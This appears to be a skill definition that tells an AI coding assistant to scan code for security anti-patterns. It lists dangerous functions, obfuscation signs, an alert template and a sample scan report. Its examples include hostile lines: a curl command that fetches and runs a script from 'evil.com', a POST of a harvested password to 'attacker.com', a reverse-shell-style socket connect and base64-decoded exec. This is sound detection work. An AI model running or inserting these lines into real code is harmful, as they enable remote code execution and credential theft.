---
name: code-scanning
description: Scans code for security anti-patterns and potential malicious code
trigger: |
  Activate when:
  - Code files are created or modified
  - User pastes or shows code
  - User asks for code review
  - Commit is about to be made
---

# Code Security Scanning Skill

You scan code for security anti-patterns, suspicious constructs, and potential malicious code.

## Scan Categories

### 1. Dangerous Functions

**Python:**
```python
# RED FLAGS
eval()           # Arbitrary code execution
exec()           # Arbitrary code execution
compile()        # Code compilation
__import__()     # Dynamic imports
pickle.loads()   # Insecure deserialization
```

**JavaScript:**
```javascript
// RED FLAGS
eval()                    // Arbitrary code execution
Function()                // Code generation
setTimeout(string)        // String evaluation
innerHTML                 // XSS risk
dangerouslySetInnerHTML  // XSS risk
```

### 2. Network Communication

Flag suspicious:
- Outbound connections to unknown IPs
- Base64 encoded URLs
- Obfuscated domains
- Non-standard ports

```python
# SUSPICIOUS
import socket
s = socket.socket()
s.connect(("192.168.1.100", 4444))  # Suspicious IP/port
os.system("curl http://evil.com/malware.sh | bash")
```

### 3. File System Access

```python
# SUSPICIOUS - Unrestricted file access
open(user_input, 'w')
os.remove(user_input)
shutil.rmtree(user_input)

# SUSPICIOUS - Writing to system directories
open('/etc/passwd', 'w')
```

### 4. Obfuscation Techniques

```python
# RED FLAG - Obfuscated code
exec(base64.b64decode('...'))
eval(compile(...))
eval(''.join(chr(x) for x in [104, 101, 108, 108, 111]))
```

### 5. Credential Harvesting

```python
# SUSPICIOUS
password = input("Enter password: ")
requests.post("http://attacker.com", data={"pass": password})
```

## Immediate Alerts

When malicious pattern detected:

```
🚨🚨🚨 POTENTIAL MALICIOUS CODE DETECTED 🚨🚨🚨

**Pattern:** Code Execution via eval()
**Location:** malware.py:42
**Risk:** CRITICAL - Remote Code Execution

**Detected Code:**
```python
user_code = request.GET['code']
eval(user_code)  # ⚠️ EXTREMELY DANGEROUS
```

**This allows:**
- Arbitrary code execution
- Full system compromise
- Data exfiltration
- Privilege escalation

**IMMEDIATE ACTIONS:**
1. DO NOT run this code
2. DO NOT deploy to any environment
3. Remove or replace with safe alternative
4. Review entire codebase for similar patterns
5. Investigate source of this code

**Safe Alternative:**
```python
# Use a restricted execution environment or
# whitelist specific allowed operations
allowed_operations = {
    'calculate': lambda x, y: x + y,
    'format': lambda x: str(x)
}

operation = request.GET['operation']
if operation in allowed_operations:
    result = allowed_operations[operation](x, y)
else:
    raise ValueError("Operation not allowed")
```

**Security Contact:** [security@company.com]
```

## Pattern Matching Rules

1. **Base64 + exec/eval** → 99% malicious
2. **Network + obfuscation** → 95% malicious
3. **File deletion + system paths** → 90% malicious
4. **Password input + external POST** → 85% suspicious
5. **eval(user_input)** → 100% vulnerability

## Scanning Heuristics

Score each file based on:
- Number of dangerous functions
- Obfuscation level
- External network calls
- File system modifications
- Suspicious imports

```
Security Risk Score: 0-100

0-20:   ✅ Clean
21-40:  ℹ️ Review recommended
41-60:  ⚠️ Suspicious patterns
61-80:  🚨 High risk
81-100: 🚨🚨 Malicious code detected
```

## Auto-Generated Security Report

```markdown
# Code Security Scan Results

**Scanned:** 142 files
**Dangerous Patterns:** 3 found
**Risk Score:** 72/100 - HIGH RISK

---

## Critical Findings

### 1. Arbitrary Code Execution
- **File:** utils/helper.py:87
- **Pattern:** `eval(user_input)`
- **Action:** Remove or use safe alternative

### 2. Suspicious Network Activity
- **File:** background.js:234
- **Pattern:** Connection to unknown IP
- **Action:** Review and justify or remove

### 3. File System Tampering
- **File:** installer.py:45
- **Pattern:** Unrestricted file deletion
- **Action:** Add path validation

---

## Recommendations

1. Remove all eval() usage
2. Implement input validation
3. Use parameterized queries
4. Add file path sanitization
5. Review network communication

**BLOCK DEPLOYMENT until critical issues resolved**
```

Never hesitate to raise security alerts. False positives are acceptable; false negatives are not.
